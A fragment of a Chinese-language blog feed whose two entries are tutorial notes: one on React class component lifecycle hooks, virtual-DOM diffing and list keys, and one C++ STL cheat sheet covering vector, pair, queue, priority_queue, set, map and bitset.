src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207101824180.png" alt="image-20220207101824180"></p><p>那么React是否有办法，在内容挂载到页面后，帮助我们调用一次定时器呢？</p><p>render的兄弟 — <strong>componentDidMount</strong></p><p>我们知道，<code>render</code>调用的时机有两个：</p><p>（1）初始化渲染</p><p>（2）状态更新之后</p><p>而<code>componentDidMount</code>则只在一个时候调用：组件挂载完毕</p><p>因此我们可以这样写</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207102946452.png" alt="image-20220207102946452"></p><p>但是，这样仍存在一些错误，当我们点击&lt;button&gt;，&lt;h2&gt;确实木大了，但是控制台提出了抗议</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207103111251.png" alt="image-20220207103111251"></p><p>组件没了，不能再更新状态了！所以我们还需要清空定时器</p><p>可以这样</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207103352556.png" alt="image-20220207103352556"></p><p>但还可以这样<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20220207_103611.png" alt="Quicker_20220207_103611"></p><p>我们从这里可以看出，React总是提前准备了一些函数，再合适的时候做着合适的事情，而这些事情，如下图所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207104241309.png" alt="image-20220207104241309"></p><p>这些函数被叫做：</p><blockquote><p> 生命周期回调函数 &lt;=&gt; 生命周期钩子函数 &lt;=&gt; 生命周期函数 &lt;=&gt; 生命周期钩子</p></blockquote><p>而函数也不仅仅只有这两个，我们将在下面几小节讨论</p><hr><h4 id="生命周期（旧）"><a href="#生命周期（旧）" class="headerlink" title="生命周期（旧）"></a>生命周期（旧）</h4><p>理解：</p><p>1、组件从创建到死亡会经历一些特殊的阶段</p><p>2、React组件包含一系列钩子函数（生命周期回调函数），会在特定时刻调用</p><p>3、我们在定义组件时，会在特定的生命周期回调函数中，做特定的工作</p><p><strong>生命周期流程图（旧）</strong></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/react%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F(%E6%97%A7).png" alt="react生命周期(旧)"></p><p>这里以求和为案例</p><p>挂载时：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207111359969.png" alt="image-20220207111359969"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207111421731.png" alt="image-20220207111421731"></p><hr><p>更新时</p><p>我们添加</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207112553312.png" alt="image-20220207112553312"></p><p>可以发现，页面开始并没有打印，而当我们按下&lt;button&gt;更新之后</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207112650035.png" alt="image-20220207112650035"></p><p>打印执行，这就是更新的含义</p><p>而在更新时，有三条路可以走</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207112031404.png" alt="image-20220207112031404"></p><p><strong><font size="5" color="red">线路2</font></strong></p><p>setState已经很熟悉了，pass</p><p><strong>shouldComponentUpdate</strong></p><p>其中的<code>shouldComponentUpdate</code>（是否更新），类似于一个阀门，返回<strong>true</strong>，代表更新可以进行，而返回<strong>false</strong>，代表更新不被允许（默认返回<strong>true</strong>）</p><p>我们添加这个钩子（返回<strong>true</strong>），再点击 + 1</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207113722669.png" alt="image-20220207113722669"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207113003173.png" alt="image-20220207113003173"></p><p>正如上面所说，每次更新之前都询问了“阀门状态”</p><p><strong>componentWillUpdate</strong></p><p>添加钩子，点击 +1 之后的控制台</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207113732494.png" alt="image-20220207113732494"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207113447355.png" alt="image-20220207113447355"></p><p><strong>componentDidUpdate</strong></p><p>添加钩子，点击 +1 之后的控制台</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207113742658.png"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207113624606.png" alt="image-20220207113624606"></p><p><strong><font size="5" color="red">线路3</font></strong></p><p><strong>forceUpdate（强制更新）</strong></p><p>不对状态做出更改（不管阀门），强制更新组件</p><p>我们把阀门设为<strong>false</strong>，尝试一下</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207114605377.png" alt="image-20220207114605377"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207114552209.png" alt="image-20220207114552209"></p><p>果然绕过了阀门</p><p><strong><font size="5" color="red">线路1</font></strong></p><p>我们要先在两个组件之间构建父子关系</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207115126627.png" alt="image-20220207115126627" style="zoom: 80%;"><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207115245571.png" alt="image-20220207115245571"></p><p>我们想通过A组件，展示B组件的信息</p><p><strong>componentWillReceiveProps</strong></p><p>由于是B组件从外部（A）接收标签，我们添加钩子查看</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207121205899.png" alt="image-20220207121205899"></p><p>点开之后，没有？？？！！！</p><p>实际上，这个钩子有个“坑“，<strong>第一次传的不算</strong></p><p>我们点击按钮（由于挂载页面时已经render一回了，这次便是第二次执行，B组件也接收到了<strong>新的props</strong>），</p><p>点之前</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207121613655.png" alt="image-20220207121613655"></p><p>点之后</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207121626480.png" alt="image-20220207121626480"></p><hr><h4 id="总结：旧生命周期"><a href="#总结：旧生命周期" class="headerlink" title="总结：旧生命周期"></a>总结：旧生命周期</h4><p><strong>1.</strong> <strong>初始化阶段:</strong> 由ReactDOM.render()触发—初次渲染</p><p>\1.    constructor()</p><p>\2.    componentWillMount()</p><p>\3.    render()        ===&gt;        必须</p><p>\4.    componentDidMount()        ===&gt;        常用</p><p>​            用于初始化，如：开启定时器、发送网络请求、订阅消息</p><p>   <strong>2.</strong> <strong>更新阶段:</strong> 由组件内部this.setSate()或父组件重新render触发</p><p>\1.    shouldComponentUpdate()</p><p>\2.    componentWillUpdate()</p><p>\3.    render()        ===&gt;        必须</p><p>\4.    componentDidUpdate()</p><p>   <strong>3.</strong> <strong>卸载组件:</strong> 由ReactDOM.unmountComponentAtNode()触发</p><p>\1.    componentWillUnmount()        ===&gt;        常用</p><p>​            用于”收尾“，如：关闭定时器、取消订阅消息</p><hr><h4 id="新旧生命周期对比"><a href="#新旧生命周期对比" class="headerlink" title="新旧生命周期对比"></a>新旧生命周期对比</h4><p>我们将上面求和的例子中的引入的React换为新版本，发现代码可以正常挂载，but</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207142824820.png" alt="image-20220207142824820"></p><p>这些警告说明了旧钩子在新版本中也可以用，但不被推荐使用，同时两个函数名称发生改变</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207143338050.png" alt="image-20220207143338050"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207143349943.png" alt="image-20220207143349943"></p><p>更改之后，下面的两个警告disappear了</p><p>简记：所有带”<strong>will</strong>“的钩子（3个），在新版本都推荐前置<strong>UNSAFE_<strong>（无关安全性，是警告可能在未来版本中出现bug），</strong>除了 componentWillUnmount</strong></p><p><strong><font color="red">官方文档中提出，那3个需要加前缀的钩子，都即将过时！！！</font></strong></p><p>我们在下面重新展示新旧的生命周期图，进行对比</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/react%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F(%E6%97%A7).png"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/react%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F(%E6%96%B0).png" alt="react生命周期(新)"></p><p>首先，带有<code>will</code>的几个”_UNSAFE“钩子没有再新周期图中出现</p><p>其次，新周期图多了<code>getDerivedStateFromProps</code>（挂载时）、<code>getSnapshotBeforeUpdate</code>（更新时）这两个新钩子</p><hr><h4 id="生命周期（新）"><a href="#生命周期（新）" class="headerlink" title="生命周期（新）"></a>生命周期（新）</h4><p>这里先说一下新生命周期的几个钩子</p><h5 id="getDerivedStateFromProps（从props得到派生的状态）"><a href="#getDerivedStateFromProps（从props得到派生的状态）" class="headerlink" title="getDerivedStateFromProps（从props得到派生的状态）"></a>getDerivedStateFromProps（从props得到派生的状态）</h5><p>我们将其添加进组件</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207145517490.png" alt="image-20220207145517490"></p><p>意想不到的事情发生了</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207145543760.png" alt="image-20220207145543760"></p><p>警告告诉我们，这个钩子挂到了实例上，请定义它，把它作为一个静态方法</p><p>加上 <code>static</code>之后</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207145827057.png" alt="image-20220207145827057"></p><p>返回又不对了，它要求只能返回一个状态对象，或者是null</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207150013930.png" alt="image-20220207150013930"></p><p>我们先返回一个null</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207150040494.png" alt="image-20220207150040494"></p><p>流程按照流程图正常显示了</p><p>但当我们返回一个状态对象 </p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;<span class="attr">count</span>: <span class="number">108</span>&#125;</span><br></pre></td></tr></table></figure></blockquote><p>我们发现显示的值不变了，+ 1 按钮也失灵了</p><p>实际上，这个钩子就收到的参数，是<strong>props</strong></p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> getDerivedStateFromProps(props)</span><br></pre></td></tr></table></figure></blockquote><p>此方法适用于罕见的用例，即state的值在任何时刻都取决于props</p><p>需要注意的是，派生状态会导致代码冗杂，导致组件难以维护</p><h5 id="getSnapshotBeforeUpdate（更新之前获取快照）"><a href="#getSnapshotBeforeUpdate（更新之前获取快照）" class="headerlink" title="getSnapshotBeforeUpdate（更新之前获取快照）"></a>getSnapshotBeforeUpdate（更新之前获取快照）</h5><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getSnapshotBeforeUpdate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;getSnapshotBeforeUpdate&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207151348202.png" alt="image-20220207151348202"></p><p>要求我们返回null或者快照，null的话更上一个相似，都pass了</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207152843950.png" alt="image-20220207152843950"></p><p>案例</p><p>当我们想实现滚动条增长，同时停在某一行时，我们可以用快照保存之前的长度，并使用<code>componentDidUpdate(preProps, preState, height)</code>接受快照，令当前的scrollTop += scrollHeight - 传入的长度，实现停留</p><hr><h4 id="总结：新生命周期"><a href="#总结：新生命周期" class="headerlink" title="总结：新生命周期"></a>总结：新生命周期</h4><p><strong>1.</strong> <strong>初始化阶段:</strong> 由ReactDOM.render()触发—初次渲染</p><p>\1.    constructor()</p><p><strong>2.</strong>   <strong>getDerivedStateFromProps</strong> </p><p>\3.    render()</p><p>\4.    componentDidMount()</p><p>   <strong>2.</strong> <strong>更新阶段:</strong> 由组件内部this.setSate()或父组件重新render触发</p><p><strong>1.</strong>   <strong>getDerivedStateFromProps</strong></p><p>\2.    shouldComponentUpdate()</p><p>\3.    render()</p><p><strong>4.</strong>   <strong>getSnapshotBeforeUpdate</strong></p><p>\5.    componentDidUpdate()</p><p>   <strong>3.</strong> <strong>卸载组件:</strong> 由ReactDOM.unmountComponentAtNode()触发</p><p>\1.    componentWillUnmount()</p><hr><h3 id="DOM的diffing算法-与-key"><a href="#DOM的diffing算法-与-key" class="headerlink" title="DOM的diffing算法 与 key"></a>DOM的diffing算法 与 key</h3><h4 id="DOM的diffing算法-amp-amp-key"><a href="#DOM的diffing算法-amp-amp-key" class="headerlink" title="DOM的diffing算法 &amp;&amp; key"></a>DOM的diffing算法 &amp;&amp; key</h4><p>当状态中的数据发生变化时，react会根据【新数据】生成【新的虚拟DOM】, 随后React进行【新虚拟DOM】与</p><p>【旧虚拟DOM】的diff比较，规则如下：</p><p><strong>key是虚拟DOM对象的标识, 在更新显示时key起着极其重要的作用</strong></p><blockquote><p>a. 旧虚拟DOM中找到了与新虚拟DOM相同的key：<br>             (1).若虚拟DOM中内容没变, 直接使用之前的真实DOM<br>             (2).若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM</p><p>b. 旧虚拟DOM中未找到与新虚拟DOM相同的key<br>             根据数据创建新的真实DOM，随后渲染到到页面</p></blockquote><p>我们以下面的题目为例</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220208093136188.png" alt="image-20220208093136188"></p><p>需求如图所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220208093150236.png" alt="image-20220208093150236"></p><p>由于两者用的key不同，导致其效率有着较大差异，且会发生问题</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220208093826423.png" alt="image-20220208093826423"></p><p>可以发现，上面的发生了数据偏移，这是个严重错误</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220208093321765.png" alt="image-20220208093321765"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220208093335416.png" alt="image-20220208093335416"></p><p>通过上面两幅图进行对比，</p><p>首先是<strong>效率</strong>问题，我们发现，由于p1是用index（索引值）作为key，当新元素放到首位时，全体元素的所引发生变化，导致所有元素都重新加载了一遍，而p2则只需加载一遍</p><p>其次是<strong>数据</strong>问题，由于diffing是<strong>分层比较的</strong>，因此在p1中，“更新小王”和“初始小张”比较，发现外层不同后，仍然进入内层比较，并认为type相同，因此保留下来了“初始小张”的框，而到最后，React发现没有索引值为2的元素，所以把”小李“和一个没输入的框挂了上去；而p2使用<strong>id</strong>比较，各个标签都能找到对应的元素</p><p>我们进行总结：</p><p>（1）用index作为key可能会引发的问题：</p><ul><li><p>若对数据进行：逆序添加、逆序删除等破坏顺序操作:    DOM更新 ==&gt; 界面效果没问题, 但效率低。</p></li><li><p>如果结构中还包含输入类的DOM会产生错误DOM更新     ==&gt;     界面有问题。</p></li><li><p>注意！如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的</p></li></ul><p>（2）开发中如何选择key?</p><ul><li>最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。</li><li>如果确定只是简单的展示数据，用index也是可以的。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="React" scheme="https://0410wzn.top/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>C++STL总结</title>
    <link href="https://0410wzn.top/2022/01/18/C++STL%E6%80%BB%E7%BB%93/"/>
    <id>https://0410wzn.top/2022/01/18/C++STL%E6%80%BB%E7%BB%93/</id>
    <published>2022-01-18T11:54:20.000Z</published>
    <updated>2022-01-18T12:01:17.659Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="C-STL总结"><a href="#C-STL总结" class="headerlink" title="C++STL总结"></a>C++STL总结</h1>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">vector（变长数组），倍增的思想，支持比较运算（按字典序）</span><br><span class="line">    定义：：</span><br><span class="line">        vector &lt;<span class="keyword">int</span>&gt; a; 定义：一个vector数组a</span><br><span class="line">        vector &lt;<span class="keyword">int</span>&gt; <span class="built_in">a</span>(<span class="number">10</span>); 定义：一个长度为<span class="number">10</span>的vector数组a</span><br><span class="line">        vector &lt;<span class="keyword">int</span>&gt; <span class="built_in">a</span>(<span class="number">10</span>,<span class="number">3</span>); 定义：一个长度为<span class="number">10</span>的vector数组a，并且所有元素都为<span class="number">3</span></span><br><span class="line">    常用函数：：</span><br><span class="line">        <span class="built_in">size</span>(); 返回元素个数</span><br><span class="line">        <span class="built_in">empty</span>(); 返回是否是空</span><br><span class="line">        <span class="built_in">clear</span>(); 清空</span><br><span class="line">        <span class="built_in">front</span>(); 返回vector的第一个数</span><br><span class="line">        <span class="built_in">back</span>(); 返回vector的最后一个数</span><br><span class="line">        <span class="built_in">push_back</span>(); 向vector的最后插入一个数</span><br><span class="line">        <span class="built_in">pop_back</span>(); 把vector的最后一个数删掉</span><br><span class="line">        <span class="built_in">begin</span>(); vector的第<span class="number">0</span>个数</span><br><span class="line">        <span class="built_in">end</span>(); vector的最后一个的数的后面一个数</span><br><span class="line">    倍增的思想：</span><br><span class="line">        系统为某一程序分配空间是，所需时间，与空间大小无关，与申请次数有关</span><br><span class="line">    遍历方法</span><br><span class="line">        假设有个vector &lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line">        第一种：</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; a.<span class="built_in">size</span>();i ++) cout&lt;&lt;a[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        第二种：</span><br><span class="line">            <span class="keyword">for</span>(vector &lt;<span class="keyword">int</span>&gt;::iterator i = a.<span class="built_in">begin</span>();i != a.<span class="built_in">end</span>();i ++) cout&lt;&lt;*i&lt;&lt;<span class="string">&quot; &quot;</span>;  vector &lt;<span class="keyword">int</span>&gt;::iterator可以写为<span class="keyword">auto</span></span><br><span class="line">        第三种：</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span>  x : a) cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">pair，支持比较运算，以first为第一关键字，以second为第二关键字（按字典序）</span><br><span class="line">    定义：：</span><br><span class="line">        pair &lt;类型,类型&gt; 变量名;    两个类型可以不同</span><br><span class="line">    初始化方式：</span><br><span class="line">        假设有个pair &lt;<span class="keyword">int</span>,string&gt; p;</span><br><span class="line">        第一种：</span><br><span class="line">            p = <span class="built_in">make_pair</span>(<span class="number">10</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        第二种：</span><br><span class="line">            p = &#123;<span class="number">10</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">    常用函数：：</span><br><span class="line">        first; 第一个元素</span><br><span class="line">        second; 第二个元素</span><br><span class="line"></span><br><span class="line">string（字符串）</span><br><span class="line">    常用函数：：</span><br><span class="line">        <span class="built_in">substr</span>(); 返回每一个子串</span><br><span class="line">        <span class="built_in">c_str</span>(); 返回这个string对应的字符数组的头指针</span><br><span class="line">        <span class="built_in">size</span>(); 返回字母个数</span><br><span class="line">        <span class="built_in">length</span>(); 返回字母个数</span><br><span class="line">        <span class="built_in">empty</span>(); 返回字符串是否为空</span><br><span class="line">        <span class="built_in">clear</span>(); 把字符串清空</span><br><span class="line">queue（队列）</span><br><span class="line">    定义：：</span><br><span class="line">        queue &lt;类型&gt; 变量名;</span><br><span class="line">    常用函数：：</span><br><span class="line">        <span class="built_in">size</span>(); 这个队列的长度</span><br><span class="line">        <span class="built_in">empty</span>(); 返回这个队列是否为空</span><br><span class="line">        <span class="built_in">push</span>(); 往队尾插入一个元素</span><br><span class="line">        <span class="built_in">front</span>(); 返回队头元素</span><br><span class="line">        <span class="built_in">back</span>(); 返回队尾元素</span><br><span class="line">        <span class="built_in">pop</span>(); 把队头弹出</span><br><span class="line">        注意：队列没有clear函数！！！</span><br><span class="line">    清空：</span><br><span class="line">        变量名 = queue &lt;<span class="keyword">int</span>&gt; ();</span><br><span class="line">priority_queue（优先队列，堆）</span><br><span class="line">    注意：默认是大根堆！！！</span><br><span class="line">    定义：：</span><br><span class="line">        大根堆：priority_queue &lt;类型&gt; 变量名;</span><br><span class="line">        小根堆：priority_queue &lt;类型,vecotr &lt;类型&gt;,greater &lt;类型&gt;&gt; 变量名</span><br><span class="line">    常用函数：</span><br><span class="line">        <span class="built_in">size</span>(); 这个堆的长度</span><br><span class="line">        <span class="built_in">empty</span>(); 返回这个堆是否为空</span><br><span class="line">        <span class="built_in">push</span>();往堆里插入一个元素</span><br><span class="line">        <span class="built_in">top</span>(); 返回堆顶元素</span><br><span class="line">        <span class="built_in">pop</span>(); 弹出堆顶元素</span><br><span class="line">        注意：堆没有clear函数！！！</span><br><span class="line"></span><br><span class="line">stack（栈）</span><br><span class="line">    常用函数：</span><br><span class="line">        <span class="built_in">size</span>(); 这个栈的长度</span><br><span class="line">        <span class="built_in">empty</span>(); 返回这个栈是否为空</span><br><span class="line">        <span class="built_in">push</span>(); 向栈顶插入一个元素</span><br><span class="line">        <span class="built_in">top</span>(); 返回栈顶元素</span><br><span class="line">        <span class="built_in">pop</span>(); 弹出栈顶元素</span><br><span class="line"></span><br><span class="line">deque（双端队列）</span><br><span class="line">    常用函数：</span><br><span class="line">        <span class="built_in">size</span>(); 这个双端队列的长度</span><br><span class="line">        <span class="built_in">empty</span>(); 返回这个双端队列是否为空</span><br><span class="line">        <span class="built_in">clear</span>(); 清空这个双端队列</span><br><span class="line">        <span class="built_in">front</span>(); 返回第一个元素</span><br><span class="line">        <span class="built_in">back</span>(); 返回最后一个元素</span><br><span class="line">        <span class="built_in">push_back</span>(); 向最后插入一个元素</span><br><span class="line">        <span class="built_in">pop_back</span>(); 弹出最后一个元素</span><br><span class="line">        <span class="built_in">push_front</span>(); 向队首插入一个元素</span><br><span class="line">        <span class="built_in">pop_front</span>(); 弹出第一个元素</span><br><span class="line">        <span class="built_in">begin</span>(); 双端队列的第<span class="number">0</span>个数</span><br><span class="line">        <span class="built_in">end</span>(); 双端队列的最后一个的数的后面一个数</span><br><span class="line"></span><br><span class="line">set，map，multiset，multimap 基于平衡二叉树（红黑树），动态维护有序序列</span><br><span class="line">    set/multiset</span><br><span class="line">        注意：set不允许元素重复，如果有重复就会被忽略，但multiset允许！！！</span><br><span class="line">        常用函数：</span><br><span class="line">            <span class="built_in">size</span>(); 返回元素个数</span><br><span class="line">            <span class="built_in">empty</span>(); 返回set是否是空的</span><br><span class="line">            <span class="built_in">clear</span>(); 清空</span><br><span class="line">            <span class="built_in">begin</span>(); 第<span class="number">0</span>个数，支持++或--，返回前驱和后继</span><br><span class="line">            <span class="built_in">end</span>(); 最后一个的数的后面一个数，支持++或--，返回前驱和后继</span><br><span class="line">            <span class="built_in">insert</span>(); 插入一个数</span><br><span class="line">            <span class="built_in">find</span>(); 查找一个数</span><br><span class="line">            <span class="built_in">count</span>(); 返回某一个数的个数</span><br><span class="line">            <span class="built_in">erase</span>();</span><br><span class="line">                （<span class="number">1</span>）输入是一个数x，删除所有<span class="function">x    <span class="title">O</span><span class="params">(k + log n)</span></span></span><br><span class="line"><span class="function">                （2）输入一个迭代器，删除这个迭代器</span></span><br><span class="line"><span class="function">            <span class="title">lower_bound</span><span class="params">(x)</span></span>; 返回大于等于x的最小的数的迭代器</span><br><span class="line">            <span class="built_in">upper_bound</span>(x); 返回大于x的最小的数的迭代器</span><br><span class="line">    map/multimap</span><br><span class="line">        常用函数：</span><br><span class="line">            <span class="built_in">insert</span>(); 插入一个数，插入的数是一个<span class="function">pair</span></span><br><span class="line"><span class="function">            <span class="title">erase</span><span class="params">()</span></span>; </span><br><span class="line">                （<span class="number">1</span>）输入是pair</span><br><span class="line">                （<span class="number">2</span>）输入一个迭代器，删除这个迭代器</span><br><span class="line">            <span class="built_in">find</span>(); 查找一个数</span><br><span class="line">            <span class="built_in">lower_bound</span>(x); 返回大于等于x的最小的数的迭代器</span><br><span class="line">            <span class="built_in">upper_bound</span>(x); 返回大于x的最小的数的迭代器</span><br><span class="line"></span><br><span class="line">unordered_set，unordered_map，unordered_muliset,unordered_multimap 基于哈希表</span><br><span class="line">    和上面类似，增删改查的时间复杂度是<span class="built_in">O</span>(<span class="number">1</span>)</span><br><span class="line">    不支持<span class="built_in">lower_bound</span>()和<span class="built_in">upper_bound</span>()</span><br><span class="line"></span><br><span class="line">bitset 压位</span><br><span class="line">    定义：</span><br><span class="line">        bitset &lt;个数&gt; 变量名;</span><br><span class="line">    支持：</span><br><span class="line">        ~，&amp;，|，^</span><br><span class="line">        &gt;&gt;，&lt;&lt;</span><br><span class="line">        ==，!=</span><br><span class="line">        []</span><br><span class="line">    常用函数：</span><br><span class="line">        <span class="built_in">count</span>(); 返回某一个数的个数</span><br><span class="line">        <span class="built_in">any</span>(); 判断是否至少有一个<span class="number">1</span></span><br><span class="line">        <span class="built_in">none</span>(); 判断是否全为<span class="number">0</span></span><br><span class="line">        <span class="built_in">set</span>(); 把所有位置赋值为<span class="number">1</span></span><br><span class="line">        <span class="built_in">set</span>(k,v); 将第k位变成<span class="function">v</span></span><br><span class="line"><span class="function">        <span class="title">reset</span><span class="params">()</span></span>; 把所有位变成<span class="number">0</span></span><br><span class="line">        <span class="built_in">flip</span>(); 把所有位取反，等价于~</span><br><span class="line">        <span class="built_in">flip</span>(k); 把第k位取反</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
